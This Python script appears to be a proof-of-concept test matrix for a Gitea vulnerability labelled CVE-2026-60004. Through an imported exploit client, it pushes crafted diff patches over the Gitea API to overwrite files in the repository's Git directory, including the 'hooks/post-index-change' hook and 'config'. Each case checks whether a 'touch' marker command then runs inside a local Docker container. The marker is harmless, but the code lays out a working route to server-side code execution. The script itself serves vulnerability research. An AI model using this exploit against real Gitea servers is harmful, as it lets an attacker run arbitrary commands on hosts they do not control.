#!/usr/bin/env python3
"""
CVE-2026-60004 Architectural Boundary & Mechanism Matrix
Evaluates 4 Git / Gitea architectural boundary conditions on isolated branches:
1. Single Patch Isolation: Tests if --cached isolates disk when no conflict occurs.
2. Pre-existing File Vector: Tests if pre-existing $GIT_DIR files (e.g. 'config') can be overwritten.
3. Inapplicable Lifecycle Hook: Tests if interactive commit hooks ('pre-commit') are triggered.
4. Target Exploit Condition: Tests add/add collision on 'hooks/post-index-change'.
"""

from __future__ import annotations

import argparse
from dataclasses import dataclass
from pathlib import Path
import subprocess
import sys

import requests

if str(Path(__file__).resolve().parent) not in sys.path:
    sys.path.insert(0, str(Path(__file__).resolve().parent))

from exploit import (  # noqa: E402
    TARGET_HOOK_PATH,
    GiteaExploit,
    add_target_args,
    validate_target_args,
)

DEFAULT_CONTAINER = "gitea-cve-2026-60004"
SEPARATOR = "=" * 88


@dataclass(frozen=True)
class MatrixCase:
    case_id: str
    title: str
    target_file: str
    repeat: int
    expected_statuses: tuple[int, ...]
    expected_executed: bool

    @property
    def branch_name(self) -> str:
        return f"branch_c{self.case_id}"

    @property
    def marker_file(self) -> str:
        return f"/tmp/m_case{self.case_id}.txt"


@dataclass(frozen=True)
class CaseResult:
    case: MatrixCase
    statuses: list[int]
    executed: bool

    @property
    def matched_expectation(self) -> bool:
        return (
            tuple(self.statuses) == self.case.expected_statuses
            and self.executed == self.case.expected_executed
        )


TEST_CASES: tuple[MatrixCase, ...] = (
    MatrixCase("1", "Single Patch Isolation", TARGET_HOOK_PATH, 1, (201,), False),
    MatrixCase("2", "Pre-existing File Vector", "config", 2, (201, 500), False),
    MatrixCase("3", "Inapplicable Lifecycle Hook", "hooks/pre-commit", 2, (201, 201), False),
    MatrixCase("4", "Target Exploit Condition", TARGET_HOOK_PATH, 2, (201, 201), True),
)


def is_container_running(container: str) -> bool:
    res = subprocess.run(
        ["docker", "inspect", "-f", "{{.State.Running}}", container],
        capture_output=True,
        text=True,
        check=False,
    )
    return res.returncode == 0 and res.stdout.strip() == "true"


def clean_marker(container: str, marker_file: str) -> None:
    subprocess.run(
        ["docker", "exec", container, "rm", "-f", marker_file],
        capture_output=True,
        check=False,
    )


def marker_exists(container: str, marker_file: str) -> bool:
    res = subprocess.run(
        ["docker", "exec", container, "test", "-f", marker_file],
        capture_output=True,
        check=False,
    )
    return res.returncode == 0


def delete_branch(client: GiteaExploit, branch_name: str) -> None:
    branches_path = f"/api/v1/repos/{client.username}/{client.repo}/branches"
    client.request("DELETE", f"{branches_path}/{branch_name}", auth=client.auth)


def recreate_branch(client: GiteaExploit, branch_name: str, base_branch: str) -> bool:
    """Ensure a fresh isolated branch forked from base_branch."""
    delete_branch(client, branch_name)
    res = client.request(
        "POST",
        f"/api/v1/repos/{client.username}/{client.repo}/branches",
        auth=client.auth,
        json={"new_branch_name": branch_name, "old_branch_name": base_branch},
    )
    return res.status_code == 201


def run_case(
    client: GiteaExploit,
    base_branch: str,
    container: str,
    case: MatrixCase,
) -> CaseResult:
    print(f"\n[*] [Test Case {case.case_id}] {case.title}")
    print(f"    Target File: {case.target_file} | Repeat: {case.repeat}x")
    clean_marker(container, case.marker_file)

    if not recreate_branch(client, case.branch_name, base_branch):
        raise RuntimeError(f"Failed to create isolated branch '{case.branch_name}'.")

    patch = client.build_patch(f"touch {case.marker_file}", filepath=case.target_file)
    statuses: list[int] = []

    try:
        for step in range(1, case.repeat + 1):
            res = client.apply_diffpatch(
                branch=case.branch_name,
                content=patch,
                message=f"c{case.case_id}-{step}",
            )
            statuses.append(res.status_code)

        executed = marker_exists(container, case.marker_file)
    finally:
        clean_marker(container, case.marker_file)
        delete_branch(client, case.branch_name)

    result = CaseResult(case=case, statuses=statuses, executed=executed)
    print(f"    HTTP Statuses: {statuses}")
    print(f"    Code Execution: {'[+] SUCCESS' if executed else '[-] FAILED'}")
    print(f"    Boundary Check: {'[+] PASS' if result.matched_expectation else '[-] UNEXPECTED'}")

    return result


def print_summary(results: list[CaseResult]) -> None:
    print(f"\n{SEPARATOR}")
    print("ARCHITECTURAL MATRIX SUMMARY")
    print(SEPARATOR)
    fmt = "{:<4} | {:<27} | {:<23} | {:<6} | {:<10} | {:<9}"
    print(fmt.format("Case", "Test Condition", "Target Path", "Repeat", "HTTP", "Execution"))
    print("-" * len(SEPARATOR))
    for res in results:
        execution = "SUCCESS" if res.executed else "FAILED"
        statuses_str = ",".join(str(code) for code in res.statuses)
        print(
            fmt.format(
                res.case.case_id,
                res.case.title,
                res.case.target_file,
                f"{res.case.repeat}x",
                f"[{statuses_str}]",
                execution,
            )
        )
    print(SEPARATOR)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="CVE-2026-60004 Architectural Matrix")
    add_target_args(parser)
    parser.add_argument(
        "--container",
        default=DEFAULT_CONTAINER,
        help=f"Target Gitea container name (default: {DEFAULT_CONTAINER})",
    )

    args = parser.parse_args()
    validate_target_args(parser, args)
    return args


def main() -> None:
    args = parse_args()

    if not is_container_running(args.container):
        print(f"[-] Target container '{args.container}' is not running.")
        sys.exit(1)

    cleanup_paths = tuple(case.target_file for case in TEST_CASES)

    try:
        with GiteaExploit(
            base_url=args.url,
            username=args.username,
            password=args.password,
            repo=args.repo,
        ) as client:
            base_branch = client.prepare_workspace(cleanup_paths=cleanup_paths)
            if not base_branch:
                sys.exit(1)

            print(SEPARATOR)
            print("CVE-2026-60004 Architectural Boundary & Mechanism Matrix")
            print(f"Target: {client.base_url} | User: {client.username} | Repository: {client.repo}")
            print(SEPARATOR)

            results = [run_case(client, base_branch, args.container, case) for case in TEST_CASES]
            print_summary(results)

            if not all(r.matched_expectation for r in results):
                print("[-] One or more architectural boundary assertions did not match expectations.")
                sys.exit(1)
    except (requests.RequestException, RuntimeError) as exc:
        print(f"[-] Matrix execution failed: {exc}")
        sys.exit(1)


if __name__ == "__main__":
    main()
